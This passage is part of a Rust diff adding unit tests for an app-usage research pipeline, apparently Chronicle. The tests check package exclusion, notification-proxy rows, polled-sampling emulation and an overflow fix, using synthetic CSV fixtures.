+                    strategy.canonical_id()
+                );
+                assert_eq!(
+                    applicability.effective.is_some(),
+                    applicability.relation != Relation::Refused
+                );
+                assert_eq!(
+                    applicability.refusal_reason.is_some(),
+                    applicability.relation == Relation::Refused
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn wider_opener_mask_keeps_app_kinds_and_suppresses_device_kinds_by_type() {
+        let wider = OpenerSet::GesisAppScopedStarts;
+        for app_kind in [
+            "Activity Resumed",
+            "Filtered App Resumed",
+            "Continue Previous Day",
+            "Standby Bucket Changed",
+            "Slice Pinned App",
+            "Foreground Service Start",
+            "Rollover Foreground Service",
+        ] {
+            assert!(wider.explicit_eligible(app_kind), "{app_kind}");
+        }
+        for device_kind in [
+            "Screen Interactive",
+            "Screen Interactive/Keyguard Shown",
+            "Keyguard Hidden",
+            "Device Startup",
+        ] {
+            assert!(!wider.explicit_eligible(device_kind), "{device_kind}");
+        }
+    }
+
+    fn canonical_test_rows(csv: &[u8], timezone: &str) -> Vec<Row> {
+        let raw = incremental::decode_source_records(csv);
+        let model = incremental::attach_device_models(&raw);
+        let rows = incremental::canonicalize_source_rows(&raw, timezone, &BTreeMap::new(), &model)
+            .expect("the focused B02 fixture canonicalizes");
+        incremental::order_source_records(rows)
+    }
+
+    fn match_and_materialize_activity_resumed_only(
+        rows: Vec<Row>,
+        filtered_packages: &BTreeSet<String>,
+        options: &PipelineV2Options,
+    ) -> (Vec<Row>, incremental::MatcherOutput) {
+        assert_eq!(options.opener_set, OpenerSet::ActivityResumedOnly);
+        let input = incremental::build_app_event_index(
+            &rows,
+            &options.same_app_stop_types,
+            &options.other_stop_types,
+            &AHashSet::new(),
+            options.model_concurrent_usage,
+        )
+        .expect("the focused B02 fixture has app-usage signals");
+        let matched = incremental::match_app_episodes_with_strategy(
+            &input,
+            &rows,
+            options.episode_reconstruction_strategy,
+            options.opener_set,
+            options.allow_stop_event_reuse,
+            options.use_activity_stopped_as_fallback,
+            options.apply_threshold_to_fallback,
+            options.long_duration_threshold_ns,
+            options.proximity_interval_ns,
+        )
+        .expect("activity_resumed_only is executable for the fused matcher");
+        let rows = incremental::materialize_candidate_episodes(rows, &matched, filtered_packages);
+        (rows, matched)
+    }
+
+    /// The filter policy deliberately blinds session-bearing labels while it
+    /// discovers excluded packages. Reconstruction must see the unblinded
+    /// native label after B01 retention, otherwise B02's narrow arm silently
+    /// loses exactly the rows the final package policy is meant to protect.
+    #[test]
+    fn filtered_resumed_transport_reaches_b02_then_restores_package_policy_and_lineage() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Target Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Target Child,Secret,Activity Paused,com.example.secret,2026-03-07 10:01:00,UTC\n",
+            "Study,P02,Target Child,Control,Activity Resumed,com.example.control,2026-03-07 10:00:00,UTC\n",
+            "Study,P02,Target Child,Control,Activity Paused,com.example.control,2026-03-07 10:01:00,UTC\n",
+        );
+        let filter_csv = b"app_package_name,known_application_labels\ncom.example.secret,Secret\n";
+        let filter_map = parse_filter_csv(
+            filter_csv,
+            PackageExclusionPreset::AllSuppliedRows,
+            FilterMatchField::AppPackageName,
+        );
+
+        let tagged = incremental::mark_app_policy_matches(
+            canonical_test_rows(csv.as_bytes(), "UTC"),
+            true,
+            &filter_map,
+        );
+        assert_eq!(
+            tagged
+                .iter()
+                .filter(|row| row.app_package_name == "com.example.secret")
+                .map(|row| row.interaction_type.as_str())
+                .collect::<Vec<_>>(),
+            vec![FILTERED_RESUMED, FILTERED_PAUSED],
+            "the filter stage must use its policy-only spellings before package resolution",
+        );
+        let filtered_packages = incremental::resolve_excluded_packages(&tagged);
+        assert_eq!(
+            filtered_packages,
+            BTreeSet::from(["com.example.secret".to_string()]),
+            "the blinded spelling is the evidence used to resolve the package policy",
+        );
+
+        let unmasked = incremental::mask_excluded_app_events(tagged);
+        let retained = apply_event_retention(unmasked, EventRetentionSet::ForegroundBackgroundOnly);
+        assert_eq!(
+            retained
+                .iter()
+                .map(|row| row.interaction_type.as_str())
+                .collect::<BTreeSet<_>>(),
+            BTreeSet::from([ACTIVITY_RESUMED, ACTIVITY_PAUSED]),
+            "B01 must retain canonical lifecycle labels after the package is resolved",
+        );
+
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.minimum_usage_duration = 0.0;
+        options.correct_duplicate_event_timestamps = false;
+        options.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
+        options.opener_set = OpenerSet::ActivityResumedOnly;
+        options.materialize_visualization_data = false;
+
+        let (materialized, matched) =
+            match_and_materialize_activity_resumed_only(retained, &filtered_packages, &options);
+        assert_eq!(matched.start_indices.len(), 2);
+        assert_eq!(matched.stop_start_indices.len(), 2);
+        assert_eq!(
+            matched.opener_set_evidence.selected_opener_type_counts,
+            BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 2)]),
+        );
+        assert_eq!(
+            matched.opener_set_evidence.materialized_opener_type_counts,
+            BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 2)]),
+        );
+
+        let selected_start = |participant: &str| {
+            materialized
+                .iter()
+                .find(|row| row.participant_id == participant && row.start_timestamp_ns.is_some())
+                .expect("each participant has one materialized start")
+        };
+        let filtered_start = selected_start("P01");
+        let control_start = selected_start("P02");
+        assert_eq!(
+            (
+                filtered_start.start_timestamp_ns,
+                filtered_start.stop_timestamp_ns,
+            ),
+            (
+                control_start.start_timestamp_ns,
+                control_start.stop_timestamp_ns,
+            ),
+            "the blinded/unblinded transport must not change reconstructed bounds",
+        );
+        assert_eq!(
+            filtered_start.source_data_rows.ranges(),
+            &[SourceDataRowRange { first: 1, last: 2 }],
+        );
+        assert_eq!(
+            control_start.source_data_rows.ranges(),
+            &[SourceDataRowRange { first: 3, last: 4 }],
+        );
+
+        let classified = incremental::classify_episode_durations(
+            materialized,
+            &filtered_packages,
+            options.micro_use_classification_policy,
+            options.minimum_usage_duration,
+            options.minimum_duration_comparator,
+            options.minimum_duration_disposition,
+            &matched.selected_nonresume_closed_indices,
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let classified = incremental::apply_app_inclusion_policy(
+            classified,
+            &filtered_packages,
+            &AHashSet::new(),
+            &AHashSet::new(),
+        );
+        let final_row = |participant: &str| {
+            classified
+                .iter()
+                .find(|row| row.participant_id == participant)
+                .expect("each participant retains one classified episode")
+        };
+        let filtered_final = final_row("P01");
+        assert_eq!(filtered_final.interaction_type, FILTERED_APP_USAGE);
+        assert_eq!(filtered_final.start_timestamp_ns, None);
+        assert_eq!(filtered_final.stop_timestamp_ns, None);
+        assert_eq!(filtered_final.duration_seconds, None);
+        assert_eq!(
+            filtered_final.source_data_rows.ranges(),
+            &[SourceDataRowRange { first: 1, last: 2 }],
+            "clearing protected timing must not clear source-row lineage",
+        );
+        let control_final = final_row("P02");
+        assert_eq!(control_final.interaction_type, APP_USAGE);
+        assert_eq!(control_final.duration_seconds, Some(60.0));
+
+        options.use_filter_file = true;
+        let result = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles {
+                filter_csv,
+                ..PipelineV2SupportFiles::default()
+            },
+        )
+        .expect("the complete filtered-resume transport runs");
+        assert_eq!(result.app_row_count, 2);
+        assert_eq!(result.opener_set_evidence, matched.opener_set_evidence);
+        let app_rows = parse_csv_to_records_with_physical_rows(&result.app_csv_bytes.to_vec());
+        assert!(
+            app_rows.iter().any(|(_, row)| {
+                row.get("app_package_name").map(String::as_str) == Some("com.example.secret")
+                    && row.get("interaction_type").map(String::as_str) == Some(FILTERED_APP_USAGE)
+            }),
+            "the complete runner must restore the protected classification",
+        );
+        assert!(
+            app_rows.iter().any(|(_, row)| {
+                row.get("app_package_name").map(String::as_str) == Some("com.example.control")
+                    && row.get("interaction_type").map(String::as_str) == Some(APP_USAGE)
+            }),
+            "the unfiltered control must remain ordinary scientific app usage",
+        );
+        let mut lineage = result
+            .row_lineage
+            .iter()
+            .filter(|entry| entry.output_kind.as_str() == "app-csv")
+            .map(|entry| entry.source_data_row_ranges.clone())
+            .collect::<Vec<_>>();
+        lineage.sort_by_key(|ranges| ranges[0].first);
+        assert_eq!(
+            lineage,
+            vec![
+                vec![SourceDataRowRange { first: 1, last: 2 }],
+                vec![SourceDataRowRange { first: 3, last: 4 }],
+            ],
+            "the exported scientific rows must retain both original event ranges",
+        );
+    }
+
+    /// B08 turns raw notification rows into an explicitly labelled proxy
+    /// channel, and never into app usage.
+    ///
+    /// Chronicle records `Notification Seen` (Android type 10) and
+    /// `Notification Interruption` (type 12) as app-scoped rows, and the
+    /// app-usage reconstruction reads neither -- output rows are episodes, so
+    /// today a notification row produces nothing at all. Each rule is checked
+    /// against the same input so the source set is the only thing the
+    /// assertions can be reading, and the headline CSV is compared across all
+    /// four values to prove the axis cannot move it.
+    #[test]
+    fn the_notification_proxy_rule_decides_which_rows_become_labelled_contacts() {
+        const RAW: &str = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // A two-minute episode of com.example.chat.
+            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
+            // Seen DURING that episode: contact the episode already accounts for.
+            "Study,P01,Child,Chat,Notification Seen,com.example.chat,2026-03-07 10:01:00,UTC\n",
+            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:02:00,UTC\n",
+            // Seen AFTER it: the app reached the user without being opened.
+            "Study,P01,Child,Chat,Notification Seen,com.example.chat,2026-03-07 10:30:00,UTC\n",
+            // An interruption for an app that is never opened at all.
+            "Study,P01,Child,News,Notification Interruption,com.example.news,2026-03-07 11:00:00,UTC\n",
+        );
+
+        let run = |rule: NotificationProxyRule| {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.notification_proxy_rule = rule;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("pipeline run");
+            let contacts = String::from_utf8(result.notification_contact_csv_bytes.to_vec())
+                .expect("utf-8 notification contact csv");
+            let rows: Vec<(String, String, String)> = contacts
+                .lines()
+                .skip(1)
+                .map(|line| {
+                    let fields: Vec<&str> = line.split(',').collect();
+                    let header: Vec<&str> = contacts
+                        .lines()
+                        .next()
+                        .expect("header row")
+                        .split(',')
+                        .collect();
+                    let cell = |name: &str| {
+                        fields[header
+                            .iter()
+                            .position(|candidate| *candidate == name)
+                            .unwrap_or_else(|| panic!("contact csv has no {name} column"))]
+                        .to_string()
+                    };
+                    (
+                        cell("app_package_name"),
+                        cell("interaction_type"),
+                        cell("any_app_usage_flags"),
+                    )
+                })
+                .collect();
+            (
+                rows,
+                result.app_csv_bytes.to_vec(),
+                result.notification_contact_row_count,
+            )
+        };
+
+        // The default emits no channel at all.
+        let (none_rows, baseline_app_csv, none_count) = run(NotificationProxyRule::None);
+        assert!(none_rows.is_empty(), "the default emits no proxy rows");
+        assert_eq!(none_count, 0);
+
+        // Each rule admits exactly its own source type.
+        let (seen_rows, seen_app_csv, seen_count) = run(NotificationProxyRule::SeenContactV1);
+        assert_eq!(seen_count, 2);
+        assert!(
+            seen_rows
+                .iter()
+                .all(|(_, interaction_type, _)| interaction_type == NOTIFICATION_SEEN),
+            "seen_contact_v1 admits only type 10, got {seen_rows:?}"
+        );
+        let (interruption_rows, interruption_app_csv, interruption_count) =
+            run(NotificationProxyRule::InterruptionContactV1);
+        assert_eq!(interruption_count, 1);
+        assert_eq!(
+            interruption_rows
+                .iter()
+                .map(|(package, _, _)| package.as_str())
+                .collect::<Vec<_>>(),
+            vec!["com.example.news"],
+        );
+        let (_, any_app_csv, any_count) = run(NotificationProxyRule::AnyNotificationContactV1);
+        assert_eq!(any_count, 3, "the union of the two single-type rules");
+
+        // The provenance is on the row: which rule emitted it, and whether the
+        // instant is time the app-usage episodes already account for.
+        //
+        // Asserted against the whole line rather than a split cell: a row with
+        // two flags carries them as `"['A', 'B']"`, a QUOTED field containing a
+        // comma, and a bare split would shift every column after it.
+        let contact_csv = {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.notification_proxy_rule = NotificationProxyRule::AnyNotificationContactV1;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("pipeline run");
+            String::from_utf8(result.notification_contact_csv_bytes.to_vec()).expect("utf-8")
+        };
+        let line_at = |timestamp: &str| {
+            contact_csv
+                .lines()
+                .skip(1)
+                .find(|line| line.contains(timestamp))
+                .unwrap_or_else(|| panic!("no contact row at {timestamp}"))
+                .to_string()
+        };
+        let inside = line_at("10:01:00");
+        let outside = line_at("10:30:00");
+        assert!(inside.contains("NOTIFICATION PROXY any_notification_contact_v1"));
+        assert!(inside.contains("com.example.chat"));
+        assert!(
+            inside.contains(NOTIFICATION_WITHIN_USAGE_FLAG),
+            "10:01 falls inside the 10:00-10:02 episode, got {inside}"
+        );
+        assert!(
+            outside.contains(NOTIFICATION_OUTSIDE_USAGE_FLAG),
+            "10:30 falls outside every episode of the package, got {outside}"
+        );
+        let never_opened = line_at("11:00:00");
+        assert!(never_opened.contains("com.example.news"));
+        assert!(
+            never_opened.contains(NOTIFICATION_OUTSIDE_USAGE_FLAG),
+            "a package that is never opened has no span to fall inside, got {never_opened}",
+        );
+
+        // A proxy contact NEVER carries a duration: a notification is an
+        // instant, and this channel refuses to invent an interval for it.
+        // Every column checked below precedes the quoted flag column, so an
+        // index into a bare split is still exact for these four.
+        let header: Vec<&str> = contact_csv
+            .lines()
+            .next()
+            .expect("header")
+            .split(',')
+            .collect();
+        for column in [
+            "start_timestamp",
+            "stop_timestamp",
+            "duration_seconds",
+            "duration_minutes",
+        ] {
+            let index = header
+                .iter()
+                .position(|candidate| *candidate == column)
+                .unwrap_or_else(|| panic!("contact csv has no {column} column"));
+            for line in contact_csv.lines().skip(1) {
+                let fields: Vec<&str> = line.split(',').collect();
+                assert_eq!(fields[index], "", "{column} must stay empty on a proxy row");
+            }
+        }
+
+        // The headline output is byte-identical under every value. This is the
+        // whole promise of a side-by-side channel.
+        for (label, csv) in [
+            ("seen_contact_v1", &seen_app_csv),
+            ("interruption_contact_v1", &interruption_app_csv),
+            ("any_notification_contact_v1", &any_app_csv),
+        ] {
+            assert_eq!(
+                *csv, baseline_app_csv,
+                "{label} changed the headline app CSV",
+            );
+        }
+    }
+
+    /// B09 re-derives the same timeline the way a POLLED collector would have
+    /// measured it, and says on every row that it did.
+    ///
+    /// The two published conversions disagree with the event stream in
+    /// OPPOSITE directions on the same input, which is the whole reason the
+    /// axis exists: a researcher comparing Chronicle totals to a polled study
+    /// is not comparing the same measurement, and the size of the difference
+    /// depends on which polled rule the other study used.
+    ///
+    /// Cadence 10 s, gap 15 s -- both defaults, both named after their source.
+    /// Grid instants fall on :00/:10/:20/... because every `HH:MM:00` UTC
+    /// instant is a whole multiple of ten seconds since the epoch.
+    #[test]
+    fn polled_emulation_reports_each_published_conversion_and_its_sampling_loss() {
+        const RAW: &str = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // E1: 35 s of com.example.a. Samples at :00 :10 :20 :30 -> four.
+            "Study,P01,Child,A,Activity Resumed,com.example.a,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,A,Activity Paused,com.example.a,2026-03-07 10:00:35,UTC\n",
+            // E2: 6 s of the same app, entirely BETWEEN two grid instants. The
+            // first instant at or after 10:00:52 is 10:01:00, past the stop, so
+            // a poller catches nothing at all. This episode is the sampling loss.
+            "Study,P01,Child,A,Activity Resumed,com.example.a,2026-03-07 10:00:52,UTC\n",
+            "Study,P01,Child,A,Activity Paused,com.example.a,2026-03-07 10:00:58,UTC\n",
+            // E3: 25 s of a different package. Samples at :00 :10 :20 -> three.
+            "Study,P01,Child,B,Activity Resumed,com.example.b,2026-03-07 10:02:00,UTC\n",
+            "Study,P01,Child,B,Activity Paused,com.example.b,2026-03-07 10:02:25,UTC\n",
+        );
+        // 35 + 6 + 25. What the event stream actually observed.
+        const OBSERVED_SECONDS: f64 = 66.0;
+
+        let run = |method: PolledEmulationMethod| {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.polled_emulation_method = method;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("pipeline run");
+            let csv = String::from_utf8(result.polled_emulation_csv_bytes.to_vec())
+                .expect("utf-8 polled emulation csv");
+            (
+                csv,
+                result.app_csv_bytes.to_vec(),
+                result.polled_emulation_row_count,
+            )
+        };
+        // Flags travel as `"['A', 'B']"` -- a QUOTED cell containing commas --
+        // so the duration is read by header position from a quoting-aware
+        // split, and flag membership is asserted against the whole line.
+        fn cells(line: &str) -> Vec<String> {
+            let mut fields = vec![String::new()];
+            let mut quoted = false;
+            for character in line.chars() {
+                match character {
+                    '"' => quoted = !quoted,
+                    ',' if !quoted => fields.push(String::new()),
+                    _ => fields.last_mut().expect("a field is open").push(character),
+                }
+            }
+            fields
+        }
+        let durations = |csv: &str| -> Vec<f64> {
+            let header = cells(csv.lines().next().expect("header"));
+            let column = header
+                .iter()
+                .position(|name| name == "duration_seconds")
+                .expect("emulated csv has a duration_seconds column");
+            csv.lines()
+                .skip(1)
+                .map(|line| {
+                    cells(line)[column]
+                        .parse::<f64>()
+                        .expect("numeric duration")
+                })
+                .collect()
+        };
+
+        // The default emits no channel and no rows.
+        let (none_csv, baseline_app_csv, none_count) = run(PolledEmulationMethod::None);
+        assert!(none_csv.is_empty(), "the default emits no emulated channel");
+        assert_eq!(none_count, 0);
+
+        // Ross: endpoint subtraction across retained samples. Run one spans
+        // :00 to :30 = 30 s for an app that was foreground 35 s; run two spans
+        // :00 to :20 = 20 s for 25 s. Both understate, and the 6 s episode
+        // vanishes entirely.
+        let (ross_csv, ross_app_csv, ross_count) = run(PolledEmulationMethod::Ross2025SampledGapV1);
+        assert_eq!(
+            ross_count, 2,
+            "one run per package, the 6 s episode is unsampled"
+        );
+        let ross = durations(&ross_csv);
+        assert_eq!(ross, vec![30.0, 20.0]);
+        assert!(
+            ross.iter().sum::<f64>() < OBSERVED_SECONDS,
+            "endpoint subtraction over samples cannot exceed the observed span",
+        );
+
+        // Cerit: retained sample count times cadence, never a subtraction. Four
+        // samples are four whole cadences (40 s) even though the app was
+        // foreground 35 s, so the SAME timeline now OVERSTATES.
+        let (cerit_csv, cerit_app_csv, cerit_count) =
+            run(PolledEmulationMethod::Cerit2025SampleCountV1);
+        assert_eq!(cerit_count, 2);
+        let cerit = durations(&cerit_csv);
+        assert_eq!(cerit, vec![40.0, 30.0]);
+        assert!(
+            cerit.iter().sum::<f64>() > OBSERVED_SECONDS,
+            "sample-count conversion rounds every partial cadence up to a whole one",
+        );
+
+        // The two published rules disagree by 20 s on 66 s of observed usage.
+        // That disagreement is the measurement the axis publishes.
+        assert_ne!(ross, cerit);
+
+        // Nothing here may move the headline output.
+        assert_eq!(baseline_app_csv, ross_app_csv);
+        assert_eq!(baseline_app_csv, cerit_app_csv);
+
+        // The provenance is on every row: which rule and cadence produced it,
+        // and that it was never observed.
+        for line in ross_csv.lines().skip(1) {
+            assert!(
+                line.contains("POLLED EMULATION ross_2025_sampled_gap_v1 @10s"),
+                "every emulated row names its method and cadence, got {line}",
+            );
+            assert!(
+                line.contains(POLLED_EMULATION_NOT_OBSERVED_FLAG),
+                "every emulated row says it was not observed, got {line}",
+            );
+        }
+        for line in cerit_csv.lines().skip(1) {
+            assert!(line.contains("POLLED EMULATION cerit_2025_sample_count_v1 @10s"));
+            assert!(line.contains(POLLED_EMULATION_NOT_OBSERVED_FLAG));
+        }
+
+        // Ross force-closes the trailing run so it counts, exactly as the
+        // released code forces the last row's gap. Cerit counts samples and
+        // never needed an end, so it forces nothing.
+        let ross_lines: Vec<&str> = ross_csv.lines().skip(1).collect();
+        assert!(
+            !ross_lines[0].contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
+            "a run closed by a package change is not forced",
+        );
+        assert!(
+            ross_lines[1].contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
+            "the trailing run is forced closed, got {}",
+            ross_lines[1],
+        );
+        assert!(
+            !cerit_csv.contains(POLLED_EMULATION_FORCED_TERMINAL_FLAG),
+            "the sample-count rule forces nothing",
+        );
+
+        // Cadence is a real knob, not decoration: sampling the same timeline
+        // every 30 s catches strictly fewer instants, so the Ross total drops.
+        let coarse = {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.polled_emulation_method = PolledEmulationMethod::Ross2025SampledGapV1;
+            options.polled_emulation_interval_seconds = 30.0;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("pipeline run");
+            String::from_utf8(result.polled_emulation_csv_bytes.to_vec()).expect("utf-8")
+        };
+        assert!(
+            durations(&coarse).iter().sum::<f64>() < ross.iter().sum::<f64>(),
+            "a coarser cadence loses more, not less",
+        );
+        assert!(
+            coarse.contains("@30s"),
+            "the row records the cadence it ran at"
+        );
+
+        // The cadence is a contract float, so a fractional one has to survive
+        // into the flag. Integer division would render 7.5 s as `@7s`, and this
+        // flag is the row's only statement of the instrument that produced it.
+        let fractional = {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.polled_emulation_method = PolledEmulationMethod::Ross2025SampledGapV1;
+            options.polled_emulation_interval_seconds = 7.5;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .expect("pipeline run");
+            String::from_utf8(result.polled_emulation_csv_bytes.to_vec()).expect("utf-8")
+        };
+        assert!(
+            fractional.contains("@7.5s"),
+            "a fractional cadence must not be truncated in the provenance flag, got {fractional}",
+        );
+    }
+
+    /// The B10 package-exclusion preset decides WHICH supplied rows exclude.
+    ///
+    /// The shipped default filter file carries an `app_filter_category` and a
+    /// per-row `filter_bool`, and before this axis no kernel step read either:
+    /// every supplied row excluded whatever its category, and a row a
+    /// researcher had set to 0 was excluded anyway. Each preset is checked
+    /// against the same three rows so the difference between them is the only
+    /// thing the assertion can be reading.
+    #[test]
+    fn the_package_exclusion_preset_decides_which_supplied_rows_exclude() {
+        const RAW: &str = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Launcher,Activity Resumed,com.android.launcher3,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Launcher,Activity Paused,com.android.launcher3,2026-03-07 10:01:00,UTC\n",
+            "Study,P01,Child,Carrier,Activity Resumed,com.carrier.app,2026-03-07 10:02:00,UTC\n",
+            "Study,P01,Child,Carrier,Activity Paused,com.carrier.app,2026-03-07 10:03:00,UTC\n",
+            "Study,P01,Child,Disabled,Activity Resumed,com.disabled.row,2026-03-07 10:04:00,UTC\n",
+            "Study,P01,Child,Disabled,Activity Paused,com.disabled.row,2026-03-07 10:05:00,UTC\n",
+        );
+        // One system row, one carrier row, and one row the researcher disabled.
+        const FILTER: &[u8] = concat!(
+            "app_package_name,known_application_labels,app_filter_category,filter_bool\n",
+            "com.android.launcher3,Launcher,system,1\n",
+            "com.carrier.app,Carrier,carrier,1\n",
+            "com.disabled.row,Disabled,system,0\n",
+        )
+        .as_bytes();
+
+        let excluded_packages = |preset: PackageExclusionPreset, use_filter_file: bool| {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.use_filter_file = use_filter_file;
+            options.package_exclusion_preset = preset;
+            let result = run_pipeline_v2_with_supports(
+                RAW.as_bytes(),
+                &options,
+                PipelineV2SupportFiles {
+                    filter_csv: FILTER,
+                    ..PipelineV2SupportFiles::default()
+                },
+            )
+            .expect("pipeline run");
+            let csv = String::from_utf8(result.app_csv_bytes.to_vec()).expect("utf-8 app csv");
+            let mut lines = csv.lines();
+            let header: Vec<&str> = lines.next().expect("header row").split(',').collect();
+            let column = |name: &str| {
+                header
+                    .iter()
+                    .position(|candidate| *candidate == name)
+                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
+            };
+            let (package_column, type_column) =
+                (column("app_package_name"), column("interaction_type"));
+            let mut excluded: Vec<String> = lines
+                .filter_map(|line| {
+                    let fields: Vec<&str> = line.split(',').collect();
+                    (fields[type_column] == FILTERED_APP_USAGE)
+                        .then(|| fields[package_column].to_string())
+                })
+                .collect();
+            excluded.sort();
+            (excluded, result.app_csv_bytes.to_vec())
+        };
+
+        // Default: every supplied row excludes, flag and category ignored.
+        assert_eq!(
+            excluded_packages(PackageExclusionPreset::AllSuppliedRows, true).0,
+            vec![
+                "com.android.launcher3",
+                "com.carrier.app",
+                "com.disabled.row"
+            ],
+        );
+        // The disabled row stops excluding; the other two are unaffected.
+        assert_eq!(
+            excluded_packages(PackageExclusionPreset::HonorFilterFlag, true).0,
+            vec!["com.android.launcher3", "com.carrier.app"],
+        );
+        // Only the system-family row excludes. `com.disabled.row` is category
+        // `system` too, so this value ignores its flag exactly as documented --
+        // the two narrowing rules are independent, not cumulative.
+        assert_eq!(
+            excluded_packages(PackageExclusionPreset::SystemScopeOnly, true).0,
+            vec!["com.android.launcher3", "com.disabled.row"],
+        );
+
+        // The axis is inert while the filter file is off, whatever it is set to.
+        let off_default = excluded_packages(PackageExclusionPreset::AllSuppliedRows, false).1;
+        for preset in PackageExclusionPreset::ALL {
+            assert_eq!(
+                excluded_packages(preset, false).1,
+                off_default,
+                "{} changed output with the filter file off",
+                preset.canonical_id(),
+            );
+        }
+    }
+
+    /// Excluding a package must not move anybody else's numbers, and the
+    /// `any_app_*` family -- the one that exists to INCLUDE excluded packages --
+    /// must keep measuring from the real episode.
+    ///
+    /// `classify_episode_durations` blanks a filtered row's DISPLAY interval so
+    /// the emitted CSV carries no timing for an excluded package. The engagement
+    /// walk used to read that blanked interval, substitute an `i64::MIN`
+    /// sentinel and subtract anyway. The wrapping subtraction produced
+    /// +2,069,578 hours on the filtered row, which read as a new engagement; the
+    /// sentinel then became the next row's `previous_stop` and produced
+    /// -2,069,578 hours there, clearing that row's engagement flags in turn. One
+    /// package in the filter file corrupted two rows, and both junk values were
+    /// baked into `tests/golden/app.csv`.
+    ///
+    /// The walk now reads the raw-episode evidence the same row still carries,
+    /// so the `any_app_*` columns are byte-identical to the unfiltered run.
+    #[test]
+    fn excluding_a_package_does_not_move_the_any_app_family() {
+        const RAW: &str = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Keep,Activity Resumed,com.example.keep,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:05:00,UTC\n",
+            "Study,P01,Child,Secret,Activity Paused,com.example.secret,2026-03-07 10:06:00,UTC\n",
+            "Study,P01,Child,Keep,Activity Paused,com.example.keep,2026-03-07 10:10:00,UTC\n",
+            "Study,P01,Child,After,Activity Resumed,com.example.after,2026-03-07 10:20:00,UTC\n",
+            "Study,P01,Child,After,Activity Paused,com.example.after,2026-03-07 10:30:00,UTC\n",
+        );
+
+        // (package, interaction_type, any_30s, any_custom_300s, any_switched, any_gap_hours)
+        type AnyFamilyRow = (String, String, String, String, String, String);
+        let any_family = |use_filter_file: bool| -> Vec<AnyFamilyRow> {
+            let mut options = test_options();
+            options.timezone = "UTC".into();
+            options.use_filter_file = use_filter_file;
+            let supports = PipelineV2SupportFiles {
+                filter_csv:
+                    b"app_package_name,known_application_labels\ncom.example.secret,Secret\n",
+                ..PipelineV2SupportFiles::default()
+            };
+            let result = run_pipeline_v2_with_supports(RAW.as_bytes(), &options, supports)
+                .expect("pipeline run");
+            let csv = String::from_utf8(result.app_csv_bytes.to_vec()).expect("utf-8 app csv");
+            let mut lines = csv.lines();
+            let header: Vec<&str> = lines.next().expect("header row").split(',').collect();
+            let column = |name: &str| {
+                header
+                    .iter()
+                    .position(|candidate| *candidate == name)
+                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
+            };
+            let indices = [
+                column("app_package_name"),
+                column("interaction_type"),
+                column("any_app_new_engage_30s"),
+                column("any_app_new_engage_custom_300s"),
+                column("any_app_switched_app"),
+                column("any_app_usage_time_gap_hours"),
+            ];
+            lines
+                .map(|line| {
+                    let fields: Vec<&str> = line.split(',').collect();
+                    let cell = |slot: usize| fields[indices[slot]].to_string();
+                    (cell(0), cell(1), cell(2), cell(3), cell(4), cell(5))
+                })
+                .collect()
+        };
+
+        let unfiltered = any_family(false);
+        let filtered = any_family(true);
+
+        assert_eq!(
+            filtered.len(),
+            unfiltered.len(),
+            "excluding a package changed the row count",
+        );
+        assert_eq!(
+            filtered.iter().map(|row| row.0.clone()).collect::<Vec<_>>(),
+            unfiltered
+                .iter()
+                .map(|row| row.0.clone())
+                .collect::<Vec<_>>(),
+            "excluding a package reordered or dropped rows",
+        );
+
+        // The ONLY difference the exclusion is allowed to make in these columns
+        // is the row's own label.
+        assert_eq!(
+            filtered.iter().map(|row| row.1.clone()).collect::<Vec<_>>(),
+            vec!["App Usage", "Filtered App Usage", "App Usage"],
+        );
+        assert_eq!(
+            unfiltered
+                .iter()
+                .map(|row| row.1.clone())
+                .collect::<Vec<_>>(),
+            vec!["App Usage", "App Usage", "App Usage"],
+        );
+        let strip_label = |rows: &[AnyFamilyRow]| {
+            rows.iter()
+                .map(|row| {
+                    (
+                        row.0.clone(),
+                        row.2.clone(),
+                        row.3.clone(),
+                        row.4.clone(),
+                        row.5.clone(),
+                    )
